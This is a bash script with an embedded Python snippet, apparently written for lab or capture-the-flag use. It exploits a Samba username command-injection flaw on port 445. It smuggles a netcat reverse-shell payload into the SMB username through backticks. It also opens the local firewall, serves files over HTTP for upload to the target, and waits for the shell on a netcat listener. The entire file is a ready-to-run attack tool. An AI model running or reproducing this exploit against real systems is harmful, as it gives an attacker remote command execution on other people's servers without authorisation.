#!/bin/bash

# ./exploit.sh TargetIP LocalIP
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <RHOST> <LHOST>"
    exit 1
fi

# save all the global ip and port here
RHOST=$1
LHOST=$2
RPORT=445
LPORT=8000

sudo iptables -A INPUT -p tcp --dport $LPORT -j ACCEPT  # make sure the LPORT is open (firewall)

# background python script
PYTHON_SCRIPT=$(cat <<EOF
import sys
from smb.SMBConnection import SMBConnection

def exploit(RHOST, RPORT, LHOST, LPORT):
    payload = 'mkfifo /tmp/564; nc ' + LHOST + ' ' + LPORT + ' 0</tmp/564 | /bin/sh >/tmp/564 2>&1; rm /tmp/564'
    username = "/=\`nohup " + payload + "\`"
    conn = SMBConnection(username, "", "", "")
    try:
        conn.connect(RHOST, int(RPORT), timeout=1)
    except:
        print("[+] Payload was sent - check netcat !")

print("Start exploiting")
print("[+] Connecting to " + str("${RHOST}") + " on port " + "${RPORT}")
exploit("${RHOST}", "${RPORT}", "${LHOST}", "${LPORT}")
EOF
)

echo "$PYTHON_SCRIPT" | python3 & # run the python samba script above

# http server for uploading files
python3 -m http.server 8564 &
HTTP_SERVER_PID=$!  # save the python process id so that when CTRL+C, the process will be killed

nc -lvnp $LPORT

# kill http server. Leaves no vulnerability for target to attack back
function stop_http_server {
    echo "Stopping Python HTTP Server"
    kill $HTTP_SERVER_PID
}

trap stop_http_server SIGINT
wait $HTTP_SERVER_PID